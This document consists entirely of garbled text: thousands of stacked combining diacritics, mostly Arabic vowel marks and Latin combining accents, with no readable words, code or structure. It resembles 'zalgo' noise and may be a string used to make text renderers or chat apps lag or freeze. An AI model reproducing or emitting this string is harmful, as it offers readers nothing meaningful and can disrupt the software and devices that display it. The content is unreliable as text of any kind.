ೈ̸ًٌٌٍَُِّ̨̲̺̗̻͍̼̜̀ͨ̽͘͏ًٌٍٍَُِِّ̢̞̙̼̗̤̲̄̆ͮͫ͘ͅ͏ًٌٍَُِّ̨͈̋͒͒͌͏̷̸ًًٌٍََُُِّّ̹͚͇͇̯ͪ̄ͧͪ̊ͬ͏̴ًًٌٌٌٍٍٍََُُِِِّّ̨̢̲̞͚̭̤͇̣̺̮̋̋̔̃ͦ̃̐͘͟͞͝͞҉̶̶̶ًًًًٌٌٌٍٍٍََََُُُِِِّّّّ̨̡̨̛̛̛̞͍̠̯̻̞̖̠̫̆ͭ̉ͥ̀̃̀̄ͨ͑̑̂̃͗͘͘͢͟͝͡͝͏̵̸̸̸̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̛̥̹̹̭͙̲̺̞̹̗̻̞̤̗̲͕̾́́̏̋ͦͧ̀̀͊ͭ̀ͥ̿ͨ̔̀̚͢͜͜͠͠͠͝͏̷̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̧̨̨̛̘̱͓͚͎̦̻̦͉̦͙̞̹̖̳̝ͧ̀̆̅̾͒́̒ͧ̍̋͗̏͗́̍̆̍̂́̄̀ͥ̈́̕͘̕͟͜͟͢͠ͅͅ҉̵ًٌَُّ̮̖̫ͩͯ̃͏̵̷̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̡̨̧̱͈͉̖̱͔͕̹͍͔̱̳̩̞̪̱̈̈͗́̈́ͮ̎̍͗ͬͤ͒́ͭ̈́̇̈́̄̅̀̚͢͢͏̵̶̴̸̸̴̴̵̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̡̧̧̡̧̢̧̧̛͉̼̘͔͈͚̭̝̜͎̯̞͕̘̣̰̗̭̹͚̮̗͍͙̼̫̣̻̲͙̩͊̽̀ͭ̀ͪ̀͆̈́ͬ̐̀͑̀̽͂ͦ̀̿͛̌̎̅̓́̑͐̐ͬ́͆̂͐̚̕͢͟͢͜͢͢͢͜͝͝͝͞͞͞͠ͅ҉̷̴̸̸̷̷̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̡̢̨̨̨̢̨̧̛̘̩̬̤̳̠̤̝̦͔̟̠̥̬̠͈͇̪̼͔̠̹̺̬̘̣͚̭͙̰̑͆͆ͬ̒͌͗̓͐ͯͪ́̿̆̇ͫ͊͌͒̉ͤͬ̊̆̃̾ͤ͂̀̃ͯ̔ͨ̀ͣ́͑̌ͤͨ̎ͧ̔͂͒̀̂́̕̕̕͘͢͜͜͜͢͠͞͞͠͠͞҉̶̷̸̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̛̟̦̗͎̟̪̘̬͈͕̟̟̎́ͤ͐́̒̈́ͪͧ͑ͪ̆ͤͨ͘̚͜͟͜͠͠͠͠͏ًٌَُّ̩̼ͬ̈͐̏͟͏ِ͕҉̴̵ًًًٌٌٌٍٍٍٍَََُُُِِِّّّ̨̧̝͔̯͇̞̘͚̲͍̠ͦ͆ͧ̑́ͯ̆͜͠͞͠҉ًَُّ̨̺̪̄̉͑͏̴̴̷̵̶̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̨̨̧̧̧̡̡̛̛̱̖̰̥̯̯͈̻͉̥͇͕̣̫͉̯̝̜̺͓͍̣̙̘͖̭̬͕̥̥̰̤ͪ́ͫ̓̃̈́̌͆́͋̀ͮ̋̐ͪ̀̏̉̿̅̈̄ͣ͆͐̍̈ͮ͐̀ͦ̈̅́ͭ͌̕͘̚͘͟͜͡͝͞͞͝͏̷̶̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̧̛̛̛͎̖̱̝̗̹̰͕̟̪͚͚̪͖̗̲̃͋̇̎̒̀͐ͦͤͥ̊ͤ͒̇̀ͪ̋͑͜͢͟͠͝ͅ҉ًًٌٌٍََُُِّّ̢̢̪͙͎̥̳̦̤͆̒͛͂̈́̆̌ͥ͢͡͝͏̴̴ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̨̛̥̮̬̪̰̤͔̬̜͕̟̣̓ͥ̍͛̀ͬ͛̊͑́̇̕͢͠͞͡͏ٍَّ̇̉͡͏̷̶̷̴̵ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̛̤̖̙͕̩͔̤̠̣̼̜̣͎̬͓̤̖ͭ̋̿̂ͤ͊̀͒͗ͩ̑ͦ̀̇̀ͯ͘̚͜͝͡͞͞҉̶̵ًٌٍٍَُِّ̢͔̟̀̽ͧ̈́͟͟͏̶̷̶̴ًًٌٌٍٍََُُِِّّ̨̞̼͕̙̙͙̟ͬ͌ͥ̃ͭͣ͟͝ͅ҉̴̷ًًًٌٌٍٍَََُُِِّّّ̧̧̧̯̺̻͕͈̪̦̮̀̀̐ͪͧͤͨ͊́̓̕҉̴ٌٍَُِّ̻͎̫ͤ̌ͅ҉ً̗̾͏ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̘͇̥̤̫͇̳ͧ̀ͫͫ͌̓ͧ́̒̿ͣ̏́ͩ̽̐̕͢͡͠͠҉̵̷̷̵̵ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̨̡̢̧̛͙͚̰͉̲͍̬͖̟̮͍̰̺̟͚̣̭ͬͫ́̈́̀͗ͯ̓̽̋̃ͥ͡͝҉̵ٍِّ̰̠̘ͪ҉̴̶̸̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̞͇͎̼̦͚̰̙̹̣͔̣͕̤͈̘͎̇̌̏̇ͬͧ̅̊̀ͪ̍̏̿ͥ̅̌̂͘͜͟͜͢͟͟͢͞͝͞͞͝ͅ҉̷ًٌٍُِّ̭̗̰̞́͒̀̌̾̈͢͏̷̶̷̸̵̴ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̧̢̧̧̢̢̛̛͇͉͈͕͇͕̟͚̟͇̗̗̘͔̜̦͔̖̲̗͎͙͉͕̹̘̥̓̽ͩͬͭͮ́̒̽̓̈́̒́ͣ̅̓̿ͩ͋̽̉͐ͮ̌́̂ͮ͊̀͗̐̀̃́͘̕͘͢͟͢͜͟͞͡͝͞͡ͅ҉̵̶̵̷̶̶̸̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̢̛̛͎̼͔͚̞̲̳̥͓̹̮̮̳̘̜̼̭̠̫̝̜̻͎̫͙̤̣̪̥͍̖̈́́̊̀̌́̈̉͂̏̅͋̓ͦ́̉̈́ͮ̅͊͌ͫ̉͒ͫ̾͋ͭͫͩͧ̓̽̏̐̄ͧͭ͐̚͘͢͜͡͞͞͠͞͝͏̷ٌٍَُِّ̧̧̘̲̫̏̀ͩ҉ًًًٌٌٍٍََُُِِّّ̡̧̧̛̠̦̙̤͖͐̋ͮ͗ͪ̃́͗ͣ͘̕͢͏̸ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̛̛̰̝͍̼̱̭̰̲͍̱̙̄͗͐͊̏̆̊̆͐͛̐͋͛ͯ̕͡͝͞͏ًَُّ͙͎̩̃͒͢͡͏̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̨̡̛̛̫̲͚͉͓̲̟̠̜͖̲̘͔̑ͤ̋ͧͦͨ̄̓̋̉͘͜͡҉̵̶̸ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̢̛̼̗̪̰̳̮͖̱͇̲͖͚̩̽͆̇̄̍̐͑́͐̒ͨͬ̀̍̂͊̊̓́̕̚͢͟͞͞͏̴̵̴̵̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̨̡̧̨̢̢̛̛̦̲͈̺̘̤̞͓̹͓̜̻̯̘̼͙̟̯̞ͭ̅̍͐̆ͬͤ̀̉̑̆̅̔̎̓ͥ̾̑ͨ̔͘͢͟҉ًٌٍٍََُِِّّ̜͈̗͎̼͓ͨ̓͢͝͏̶ًًًٌٌٌٍٍََُُُِِّّ̢̡̢̱̞̘̦̭͖́̇̀̑̏͐̔́͆ͩ̕̚͜͟͜͝͏ٍِّͦͧ̕͏̸̷̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّ̨̢̧̧̨̜͍̻͙̞͇̞͖͍̜͉̤̻̗̠̗̖̥͕̮̥́ͮ̎̀͆̍̋̇̔̾̌̾͛̍͘̕̕̕͘͞͞͠͡͝͏ّ̤̿͏̶̷̷ًًًٌٌٌٍٍَََُُُِِِّّ̱̱͉̠̼̰͙ͯ̀ͮͮ̌̀̓̈͊̌͒̌͘͘͘͞͏̵̶̴̷̷̶̸̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّّ̡̛̛͙͙̳̟͈̰̬̻͖̝͎̫̠͚̣̦̤̮̖̻̬̞̦͉͈͖̗͉̹̺͎͈͙̳̘̗͓͕̲̹̅ͯ̄̊ͨ̇ͦ͐͌́̄ͮ̓̐ͯ́̓̃ͨ̆̔ͪͨ̆ͤͯ̐̓ͬ̔͗̓̆̀̽ͭ̕̕͘̕͟͟͢͟͜͟͝͝͠͞͝͞͝͡͞͞ͅ҉̸ٌٍُِّ̡̡̜͖̦͖ͫ̅̓̍͏ًَ̩͡ͅ҉̵ٌٍُِ͓ͨ̂̏ͪ҉̶̶̴̶ًًٌٌٍٍَََُُِِّّّ̡̝͕͚͇͚͚͍͓͆́͐ͥ͒͟͠҉̶̵ًًًٌٌٌٍٍََُُُِِِّّ̡̧̛̟͓͇͓͈͍͔̪̜̹̙ͪ͒̂́ͮ̅͠͡͏ًٌٍَُِّ̰̺͙̪̑͊̊̕͘҉̸̶̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̡̩̺̤̝̼̗̯̙̻̗̟̂̓̄ͫͦ͒́͊ͣ͘͘̚͘͝҉̶̷̸̵ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̧̡̢̛̛̛̛̙̰̥̗̞̱͓͓̠̘̺̺̳̟̗̣̮͉̺̫̖̬̮̖͇̓͒́̀͌̎͂ͧ́͋ͣͤ̇͂͂̄̀́̀ͬ́͐̕͘̚͠͞͠͞͏̴̶̶̴ًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̨̳̰̺̥͔̝̜̫̖̬̯̜̖̳ͨͤ͑̏́̃̆̇ͭ̒̓̊̊̾͒̚͘͢͜͢͜͟͟͠͡͏̴̷ًًٌٌٍَُُِِّ͓̳͎͍͈̋ͩ͋̊́̒̃́͏̵ًٌٍٍَُِّ͇̗͆͛ͧ͗ͭ́͏ّ̅͏̶ًًٌٌٍٍَََُُِِّّ̡̨̢̪̣̺̣̟͇͗̈́̐̏̅̾̈́̓ͨͭ͘͏ًًًٌٌٍٍََُُِِّّ̪̹̥̼̯̱͙̗̀̽̂͋̋̄̀̂́̕͢͝҉̵̶̵ًًٌٌٌٍٍََُُُِِّّ͎͚̙̤͍̮͎̫͖͂̃̽͋ͭ̌̄ͬ̕̕͘͜͟͝͝҉̸̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̨̡̧̡̡̥̖͓͓͍̹̞̼̣̘̥̊̔́̎́ͣͭ̒͌͐̎̀̽̕̕̚͜͞͝͏ًٍَُّ̫͖̪̹̔ͬͣ҉̵̸̷̶̶ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِِّّّّّّّّ̧̢̢̨̢̨̢͇͓̲̟͇̝̜͍̘̹̟̳̰͚̦̯̭͖̼̠͙̭̤̺̜̣ͥ̅ͦͮ̂͊̋ͤͩ̐́͛̉̓̾ͧ͂́ͫ̃ͯ͌̄̊͐̈̈́̂̚͘̕͘͘̕͟͝͡͞͏ًًٌٌٍٍََُُِِّّ̗̪̖̥̱͎ͨͣ̆́̿̂́̃͋͒ͮ͜͟͡͞͠͡ͅ͏̸̷̷ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̨̡̛̘̘̬̼͉̣̠͙̪̦̪̩̜͙͔͋̎ͭ͊͂̒̍̾ͤ̓̋́͌͐̏ͭ̚͘͟͠ͅ͏ًًٌٌٍٍٍََُُِِّّ̧̧̛̗̟̜͕̰͙͚̗̯͖͒̄̀͊̒̑̚͘͜͝͝҉َّ҉ًٌُِ̛̟̭̰̀̔͏̷̷ًًٌٍٍََُِّّ̙̘̬̘̘͉ͪ͆ͭ̎ͬ̕͢͝ͅ҉̴ًٌٌٍٍََُُِِّّ̨̣̦͖̝̖̭͇͙̖̒̄ͮ̎̀̂ͦ̕͝͏ًٌٍُِّ̦͍̠̪ͭ̋̌̚ͅ͏̶ًًٌٍََُُِّ͈̟̖̒͐̑̆̕͡͠͏ًٌٌٍَُِِّ̧̮̩̻̪̤͆̏̿̒̀ͦ͝͠͞͡ͅ҉̴̵̶̶ًًًٌٌٍٍٍَََُُُِِّّّ̯̩͚͔̰̦̣̻͔̭̔̉̄͋ͦͮͥ̒̇́͜͟͡͝ͅ҉̵ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّّ̡̢̡̡̛͕̙̮̺̥̭͙̖̗̗̳̱̪ͧͩ̓͒͆͛ͭͤͯ̎̉ͣ̃ͫ̎͑̑͘̕͟͢͡͝͡͞ͅ҉̵ًًٌٌٍٍََُُِِّ̨͔͍̘͍̜̺͚ͤ̆͗̌́ͣ͘͞͞͡͏َّ̨̳̌҉̶̸̶ًًًًٌٌٌٍٍٍَََُُُُِِِّّّ̧̧̧̢̱̠͉̦̭̬̞̮͈̞ͥ́̄ͦ̀ͤ̅̋̓ͬ̕̚͟͞҉̷ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̨̢̡̡̢̧̢̨̛̛̻͙̩̹̞̲̠͙̗̳̥̝̼̗̟̩̮̱̖̱̞͎̳͚̻̯̲͖̦̟̫̥͙̃̔ͧͪ͂̀ͫ̋ͣ͒͐̿̎̉ͬ̓̂̑ͨͤ̌ͫͣ̆̚̕͟͜͢͝͞͞͝͞҉̴ًًٌٌٍٍََُُِِِّّ̛̛̺̹̙̩͚̭̟̀ͯ͋̀̅͂ͭͪ̐͜͢͞͠͏ًٌٍٍَُِّ̧̨̺̪̠̜ͧ͢͡҉َّ͚̳̏҉̶̴̶̸̷̸̶̷̵̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̨̡̢͇͉̼̻̥̰͚̮̖̲͈̪̖̺̱̞̳̺͔͉̤͇̻ͤ͗͛͑̀́̄ͭ̽̿͗̓̋͋̾̈́̒ͤͨͥ̊̓́́̒͑̓͛̔̈̓͊̎ͪ͛̂͑͑ͬ̒̚̚̕͟͜͜͟͜͜͝͝͞͝͝͝͝҉̸ًًًٌٌٌٍٍَََُُُِِّّ̡̨̖̞̜̻̖̞̀̌͐̑͗ͨ̄̌̀̃̍̈́́̇ͬ͟͞ͅ͏̴ًًٌٌٍٍٍََُُِِِّّّ̢̧̛̼̗̰͓͙̼̏ͮ́̒̔̋ͭ̈́ͨ͆͢͞͠͞ͅ҉̴̶̴̶̷ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُِِِِِِِّّّّّّّ̨̧̡̛͚͖̼̯̼̘̖̪̞͔̮͈͎̻͈̘͖͉̳͔̙̍̀͐͒ͫ̐̍̐͊̎͛̒̐̓ͤͦͭͯ̑ͬ͐͐̇̀̒̓̑͗̕̕͜͜͢͜͠͠͞͠͝ͅ͏̵̵̶̴̶̵̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّّ̡̨̢̧̛̛̙̻̖͉̗̣̣͖͇͉̳̰̘̜͉̰̠̳̣̮̲͖̭̯̮̅͋ͦ̽ͪ͗͒͂̀͗̉̋̆ͨ͒̎̎͛̄͑̚̕̕̕͟͜͝͡ͅ͏ًٌَُ̰̳̫̪́ͬ͒͊͘҉ِ̗͏̴̷̷̶̶̷̷̴̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّّ̢̡̧̡̡̛̛̣̥̯͓̜̰̜̻͚͇̳̣̭̥͖̦̭̫͎̣͇͔̘͖̫͍̹̘̺͖͈̘͍͈͓͙͎̺͔̥̊̀̒͋͊̉̽͆ͫ̎̏͑̿̓ͤͤͦ́ͬ̂͗ͮ͆̉̋̓̉ͩ͘͘͟͢͢͜͟͟͟͞͠͠͠͡ͅ҉ٌٍَُِّ̛̖̣̊̌̇͂ͣ͘͏̴ًٌٍُِ̪̭́͐̈͡͠͏ًًٌٍََُُِّّ̫͚̬̘͓̲ͦ͌̓́͛͜͝͡҉̶̷ًٌٌٍٍَُِِّ̡̡̬̗͈̮̹ͯ̉̄̾̽̍͊̕͘͝͏ّ̯̊͏̷̸̸̵̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̨̡̨̢̡̛͕̮̥̦̘͓͍̲̞̮̟̭͓͕̫͍̞̻̱̼͉̫̮̝̙͖̞̣̺͍̥͖̯͛̆́͛ͭ̓ͬ́ͦ̃͑ͩͪ͛̑͗̓ͥ͛̆̽ͥͩ̄͌ͬ̒̂̍̋͘̕͘͜͞͝͠͝҉ًًٌٌٌٍٍََُُِِّّ̢̨̨̛̭̳̩̮͉̲ͯ̎̀̿͘͡ͅ͏̴̵̶ًًًًٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̨̢̢̳̝̬̺̭͓̺̝͈̖̜̖̜͎̞̥͓̰ͣ͗ͨ́̇̓̀̃ͣ̀̒͒͋̀̈́̕̚͝͝҉̴̴̷̴̷ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̨̧̢̯͇͖̤̻̟͎͖̩̻̬̱̲̟̞̘̥̥͍̠̰͍̔̌͌̌̈́͛̔ͩ́͆̇͋͆̏̓͗̚͜͟͞͠҉̸̵ًًٌٌٍٍََُُِِّ̤̣͉̼͚̭̪̜̲̮ͨ̎ͨ̀̊̒͊̍̕̚͝͏̵ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̢̢̡͎̪̲̪̥̱͖͔̩͕ͦͤ̀̾̃̑̏͐̄͒ͤ͂̏͘̕͘͢͠͠͡҉ًُ̝̔́͏̷̴ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̨̡̡̗̪͖̬̘͎̮̥̺̤̜͖̺̣̗͖̇̽ͧͧͫ̔̑ͬ͋̀ͧ̄͊̈̊̕͡͠͝͏ًٌٍُِ̪̝͎͕ͤ̽̋̈̕̕҉̸ًًٌٍََُِّّ̧̛̬̭̖̪̳͚ͬ͒ͭ͡͏ًًٌٌٍٍََُُُِِّّ̧̛̛͈͈͕̳̫̹͍̭̼̦̂̑͗̈́ͣ͒͛̊͜͞͠҉̸̷̵̶̸̵ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̧̧̛̛̻̻̺̣͓̝̫͉̞̱̟̯̜̲͔͇͍͓̼̫̗ͩ͐ͥ͊ͬͣͭ̓̀ͧ̈́̀̓̂̓̄̌ͩ̂͒ͧ͗̈́͛͛̅͊͟͟͢͢͢͟͟͝͞͠͠҉ٌٍُِّ̢͇̺̠̗̄͏ًَ͇̜̏͠҉̴ٌٍُِّ̗͉̘͊͟͏̷̴̶̵̸ًًًٌٌٌٍٍٍَََُُُِِِّّ̡̡̢̢̻͎̟͕̮̫͉̰̙͎̝ͮ́̆ͪ̒̉̀̚̚͢͞͠҉̴̵̸̷̸̴̴̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̨̡̧̨̤̯̬͙̟̜̻͉̩͙̫͎͎̱͎̣̝̤͈͍̳̩͓̯̭̗͕̂̎̈̅̇͑ͦ͂̐̄͆͛̊ͣͯ̉̊́͑ͯ̏ͧ͗̑̋ͩ̍ͩ̆̈̚̚̕͢͢͟͢͢͠͞҉̵̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̡̨̨̢̗͍͈̗̜̱͖̤͔̭̹͍̫͔͖̰̠̜̦̥͗̉̎́͛ͭ̀ͫ́̊́̒ͥͦͪͤͬ̑̕͘̕̕͜͢͞͞͞͡͡͠҉ً͓́҉̸ًًٌٌٌٍٍََُُُِِّّ̧̨̛̞͙̤͉͙͕̙̱̠̓̉͂̽̿̿̽́ͬ͝͏ٍِ̱̲̌̚҉̷̴̶̸̶̷̵̵̵̴ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّ̨̡̧̧̨̨̢̢͈͇̝͈̤̯̺͙͇͉̤͈̞̠͍̯̠̳͇̖̩̳͍͕̮͚̹̺̩͓͔̱̦͕͔̣͍̰͉̬͉͍̮͖͓̰̰̖̣͙̘̠͎̄̇̽ͧͮ̀ͯͣ̍ͬ́͗̉͛̎ͯ̀̑͒̇̇̆̊̓͌͐ͯ̓ͥͭ̔̃ͨ̏̎̌ͧ̋́̑͛̇̊̈̎ͤ͐̃̀̉ͭ͐̅͂̆͗̉̄̂̍ͭͭ̀͛̈̈͘͘̕͘̕͘͜͟͟͢͜͢͢͢͜͟͡͞͡͡͠͞͠͞͝ͅ͏̷ًٌَُ̱͇̓̎̏͠͠͏̴̷̶̸̸̵̵̶̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̧̡̡̨̨̧̛̤͍͈̹̻͖̥͉̫̙̹͖̺̠̺̭̘̙̫͙̣̰̲̩̱̪̽̈̅̍͋̂̏ͩ͂̃̇́̄̓̓̓̃ͯͯͣͪ̃̀̓̏̓̋ͨ̏ͦͫͭͣ̇͘͘̕͘̚͜͟͜͞͞͞͞͡͡͠͠͏ًٍَُّ͙̎́̌͠͏ٌٍِ̙̜͓ͭ̊͞҉̵̶̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̡̺͉̙̘͈̲͕̰͍̪͖ͦ̈̀̃̂̀̀̀ͧ̏͆͗ͬ͒̈̕̚͝͝͝͏̶̸ًًًٌٌٍٍَََُُِِّّّ̨̨̮̝̞͈̬͓̙̳͑̄̿ͧ̒͑͋̕͡͠͞҉ًٌٍَُُِّ͕̻̪͍͈͋̋̀̿͋̐͆͢͏̵̸̷ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̢̢̧̡̧̩͖̤̦͖̰͚̘͓͖͓̯̻̼̖̔ͭ̀͌͛ͬ͐̈́̀̍̌͒ͦ̏ͯͬ̍̀͘͘͢͟͢͡͠͏َّ̗̀҉̴̶̶̸ًًًًًٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̨̧̢̦̫̰̻̪͇̩̬̥̹͈̱͎͓̣̼͉̭̮̃́̍̀͆ͮ͛̏ͦ͒̊ͦ̀ͥͣ̂̿̓͋͊̆̈͢͟͞͡҉̷̷ًٌٌٍٍََُِِّّ̡̨̡̢̛̗͇̠̹͍̺͑̅̏ͬ͟͏ًًٌٍَُِّ̡͉͕̹͔͚̆̓̎͘͜͏̷̷ًًٌٌٍٍََُُُِِّّ̢̦͔̤̻̳͔̗̓̏́̿̈ͥͦͨ̍͐ͦ́ͨ̔̕͠͏̸ًًٌٌٌٍٍََُُِِّّ̧̨̼̪̟̙̙͈̥͈͓ͬ̎̑ͨ́̐̌ͥͨͧ͜͞͠͡҉̴ًٍَِّ̧͓̖̻̇̒̈́͏ٌُ̛̞̭ͩ͏ًٍَُِّ̗̖͉́̎͞͏ًٌٌٍَُِّ̨͔̳̩̺̰̒̀̔̀̌͆҉̶ًٍَِّ̺̗̩̻ͪ́͞͞҉̷̸ًًٌٌٍٍََُُُِِّّ̡̙̼̻̩̠̀͂̇̕͘͟͠ͅ҉ٌٍَِّ̛̬̟̩̳̉͠҉ً͏ٌٍَُِّ̨̞̱̗͇̋́͠҉̷ًًٌٌٍَُُِِّ̨̣̫̟̱̳͕̐̍͛͂ͯͭ̔̓͆͘͟͝҉̷̵̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِّّّّ̨̧̧̡̡̛͕͚̼͕̻̬̫̼̱͕̞̳̝͉̳͗͆̾ͨ̈́̎̓̂̍͂̊̌̋̕͞͡ͅ͏̵ًًٌٍٍََُُِِّّ̜̦̱̯͕̰̤̆̉́̀̏̅͟͞͞͏̸̶̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̡̨̗̟͚̭̩̮͉̣̦̲̗̪͖̺̺̹̓̇ͨͪ̀̀̀ͥͮ̑͋̿͌̄̏ͭͦ̓͆ͧ̊͌̈́̕̚͘͟͟͟͜͜͞͡͡͡ͅͅͅ҉ٍِ̞̓͢͏َّͣ̀̚҉̸̵̷ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̨̢̡̛͕͓͓̰̣̫̠͖̺̘̬̜̘͉̘̪͚͓̆͒̓̀ͨ̋̇̒ͬ̆ͫ͆̐ͨ͊̾̐̆͘͘͘̕̕͟͝҉̶̴̴ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̨̢͔͈̺̙̯̻̠͙̠͖̻͍̱̲̝ͯ̄̅́̓ͮͪ̃̉̌̅̑̕͜͡͞͡͠͞҉̸̶ًًًٌٌٌٍٍٍََََُُُِِِّّّ̧̨̢̧͇͓͚̪̞̟͓͔̣̙̦̼͆́̎̇̇̽͒̏̓ͯͩ̋̑̿̀̚͘̕͢͢͞͠҉̸ًُ̣̾҉̶̷̴̷̶ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̧̛̛̬͍̫̹̰͉͙̖̙̜͙̘͉̯̞̫̓̐̇͊̀̐̈ͫ͌̓͑͗̒ͩ̐ͫ̀̆͘͟͟͡͝҉̸̷ًٌَُّ̟̟̼̉̃̉͜͏̴̶̵̴̷̵̵̴̶̵̷ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّ̡̡̧̨̢̡̧̨̡̢̛̛̛̛̱̘͇̦̜͉͇̝̩̩̟̻̼͉̙̰͙̯̦̬̺͉̩̞̳͔̬̘͖̦͓̲̩͍̜̭͖͓̰̯̠̯̪̬̯͔̩͔̘͚̹͓̈́̐̉͐ͯ̀͌ͨ̆̊ͫͮ̀̌͐̓̉̇͆̄ͣ͊̑ͦ́͌͛̆͐̀̃̈́͊̄̀͗̆̃ͥ̆̿ͯ̉̓ͦ̍̐̀͌͐͑͑ͫ̌ͥ͋́̃ͩ̀̕̕̚̕̚̕̕͜͜͜͟͢͝͞͞͞͝͠͠͠͠͡͝ͅͅ͏ِ͏̸̴̶̵̵̴̴̷̵̷ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّّ̡̡̨̨̨̧̡̡̡̢̡̛̛̛͙̳̮̟̥̜͍̲̞͕̼̟̖̤̦͇̯̫̮̪͉̲̺̲͙̯̪͙̪̲͔̲̤̣͕͉̲̬̔̋̓ͧ͌̇ͬ̓ͫͦͯ̊́͛ͨ̍̿ͧ́̆̍̽̇̋̈̈́̓̀͑̀̀͌̍ͯ̇̓ͣ̚͘̚̚̚̕͢͢͜͟͢͜͠͡͡͞͝͠͠͝͞͡ͅͅ͏ً͏̶̴̶̸ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̡̧̨̧̡̛̛̹̭̗̝͇̗̙͈͓̜̠͓̙̞̪̦͓̘̜̺̝̞̳̺͈̻̣͙͉͙͋̋͛ͮͯ̅̒ͫͦͦ͒ͥͪͥ̎̉ͦ̾̈͒̍͂͒̅͊̿̅́ͦͩ͗̐͘͘̕̚͘͢͜͜͠͞͡͝͡͞͠͠҉̶ًَُ̖͒̈́